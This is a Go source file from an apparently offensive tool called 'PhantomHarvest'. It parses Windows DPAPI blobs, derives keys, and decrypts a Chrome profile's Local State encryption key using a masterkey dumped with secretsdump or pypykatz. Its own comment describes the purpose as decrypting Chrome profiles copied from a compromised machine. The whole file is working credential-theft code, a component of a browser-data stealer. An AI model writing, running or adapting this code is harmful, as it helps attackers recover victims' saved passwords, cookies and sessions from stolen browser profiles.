//go:build decrypt

package decrypt

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"crypto/sha1"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"hash"
	"io"
)

var dpapiMasterKey []byte

// SetDPAPIMasterKey stores a pre-decrypted DPAPI masterkey (hex-encoded) that
// PhantomHarvest will use to decrypt a Windows Chrome Local State blob offline.
// This is the key secretsdump outputs as dpapi_userkey, or pypykatz returns
// from `dpapi masterkey`. Enables decrypting Chrome profiles from a machine
// you've compromised without running on it (e.g. copied profile + SMB dump).
func SetDPAPIMasterKey(hexKey string) error {
	mk, err := hex.DecodeString(hexKey)
	if err != nil {
		return fmt.Errorf("invalid masterkey hex: %w", err)
	}
	if len(mk) == 0 {
		return fmt.Errorf("empty masterkey")
	}
	dpapiMasterKey = mk
	return nil
}

type dpapiBlob struct {
	Salt     []byte
	AlgCrypt uint32
	AlgHash  uint32
	Data     []byte
}

func parseDPAPIBlob(raw []byte) (*dpapiBlob, error) {
	r := bytes.NewReader(raw)

	readU32 := func() (uint32, error) {
		var v uint32
		return v, binary.Read(r, binary.LittleEndian, &v)
	}
	skipN := func(n int64) error {
		_, err := r.Seek(n, io.SeekCurrent)
		return err
	}
	readVarBytes := func() ([]byte, error) {
		n, err := readU32()
		if err != nil {
			return nil, err
		}
		if n == 0 {
			return nil, nil
		}
		b := make([]byte, n)
		if _, err := io.ReadFull(r, b); err != nil {
			return nil, err
		}
		return b, nil
	}

	// version (4) must be 1
	ver, err := readU32()
	if err != nil {
		return nil, fmt.Errorf("read version: %w", err)
	}
	if ver != 1 {
		return nil, fmt.Errorf("unsupported DPAPI blob version %d", ver)
	}
	// provGUID(16) + masterKeyVersion(4) + masterKeyGUID(16) + flags(4) = 40
	if err := skipN(40); err != nil {
		return nil, fmt.Errorf("skip header: %w", err)
	}
	// description (variable length, UTF-16LE)
	if _, err := readVarBytes(); err != nil {
		return nil, fmt.Errorf("read description: %w", err)
	}
	algCrypt, err := readU32()
	if err != nil {
		return nil, fmt.Errorf("read algCrypt: %w", err)
	}
	// algCryptLen (4)
	if _, err := readU32(); err != nil {
		return nil, err
	}
	salt, err := readVarBytes()
	if err != nil {
		return nil, fmt.Errorf("read salt: %w", err)
	}
	// hmac (usually 0 length)
	if _, err := readVarBytes(); err != nil {
		return nil, err
	}
	algHash, err := readU32()
	if err != nil {
		return nil, fmt.Errorf("read algHash: %w", err)
	}
	// algHashLen (4)
	if _, err := readU32(); err != nil {
		return nil, err
	}
	// hmac2 (usually 0 length)
	if _, err := readVarBytes(); err != nil {
		return nil, err
	}
	data, err := readVarBytes()
	if err != nil {
		return nil, fmt.Errorf("read data: %w", err)
	}

	return &dpapiBlob{
		Salt: salt, AlgCrypt: algCrypt, AlgHash: algHash, Data: data,
	}, nil
}

// deriveDPAPISessionKey derives key+IV from masterKey+salt using the DPAPI
// iterative hash derivation. Each round appends Hash(0x00 0x00 0x00 round |
// masterKey | salt). Key occupies the first keyLen bytes, IV the next ivLen.
func deriveDPAPISessionKey(masterKey, salt []byte, algHash uint32, keyLen, ivLen int) (key, iv []byte, err error) {
	var newH func() hash.Hash
	switch algHash {
	case 0x8004: // CALG_SHA1
		newH = sha1.New
	case 0x800C: // CALG_SHA_256
		newH = sha256.New
	default:
		return nil, nil, fmt.Errorf("unsupported algHash 0x%04x", algHash)
	}

	needed := keyLen + ivLen
	derived := make([]byte, 0, needed+64)
	for round := 1; len(derived) < needed; round++ {
		h := newH()
		h.Write([]byte{0, 0, 0, byte(round)})
		h.Write(masterKey)
		h.Write(salt)
		derived = append(derived, h.Sum(nil)...)
	}
	return derived[:keyLen], derived[keyLen : keyLen+ivLen], nil
}

// decryptDPAPIBlobWithMasterKey decrypts a raw DPAPI blob (the bytes after
// stripping the "DPAPI" prefix from the Local State encrypted_key) using a
// pre-decrypted masterkey. Supports CALG_3DES (0x6603) and CALG_AES_256
// (0x6610) with both CALG_SHA1 (0x8004) and CALG_SHA_256 (0x800C) hashing.
func decryptDPAPIBlobWithMasterKey(blob, masterKey []byte) ([]byte, error) {
	parsed, err := parseDPAPIBlob(blob)
	if err != nil {
		return nil, err
	}

	switch parsed.AlgCrypt {
	case 0x6603: // CALG_3DES — 24-byte key, 8-byte IV
		key, iv, err := deriveDPAPISessionKey(masterKey, parsed.Salt, parsed.AlgHash, 24, 8)
		if err != nil {
			return nil, err
		}
		block, err := des.NewTripleDESCipher(key)
		if err != nil {
			return nil, err
		}
		if len(parsed.Data)%des.BlockSize != 0 {
			return nil, fmt.Errorf("3DES ciphertext not block-aligned")
		}
		pt := make([]byte, len(parsed.Data))
		cipher.NewCBCDecrypter(block, iv).CryptBlocks(pt, parsed.Data)
		return pkcs7Strip(pt, des.BlockSize), nil

	case 0x6610: // CALG_AES_256 — 32-byte key, 16-byte IV
		key, iv, err := deriveDPAPISessionKey(masterKey, parsed.Salt, parsed.AlgHash, 32, 16)
		if err != nil {
			return nil, err
		}
		block, err := aes.NewCipher(key)
		if err != nil {
			return nil, err
		}
		if len(parsed.Data)%aes.BlockSize != 0 {
			return nil, fmt.Errorf("AES ciphertext not block-aligned")
		}
		pt := make([]byte, len(parsed.Data))
		cipher.NewCBCDecrypter(block, iv).CryptBlocks(pt, parsed.Data)
		return pkcs7Strip(pt, aes.BlockSize), nil

	default:
		return nil, fmt.Errorf("unsupported algCrypt 0x%04x", parsed.AlgCrypt)
	}
}

func pkcs7Strip(b []byte, blockSize int) []byte {
	if len(b) == 0 {
		return b
	}
	pad := int(b[len(b)-1])
	if pad <= 0 || pad > blockSize || pad > len(b) {
		return b
	}
	return b[:len(b)-pad]
}

// deriveChromiumKeyFromDPAPIBlob reads the encrypted_key from a Chrome Local
// State file, strips the "DPAPI" prefix, and decrypts the blob with the
// provided masterkey to return the raw 32-byte Chrome AES encryption key.
func deriveChromiumKeyFromDPAPIBlob(profileDir string, masterKey []byte) ([]byte, error) {
	raw, err := readLocalStateKey(profileDir)
	if err != nil {
		return nil, fmt.Errorf("read Local State: %w", err)
	}
	// raw = b"DPAPI" + dpapi_blob
	if len(raw) < 5 || string(raw[:5]) != "DPAPI" {
		return nil, fmt.Errorf("encrypted_key missing DPAPI prefix")
	}
	chromiumKey, err := decryptDPAPIBlobWithMasterKey(raw[5:], masterKey)
	if err != nil {
		return nil, fmt.Errorf("DPAPI decrypt: %w", err)
	}
	return chromiumKey, nil
}
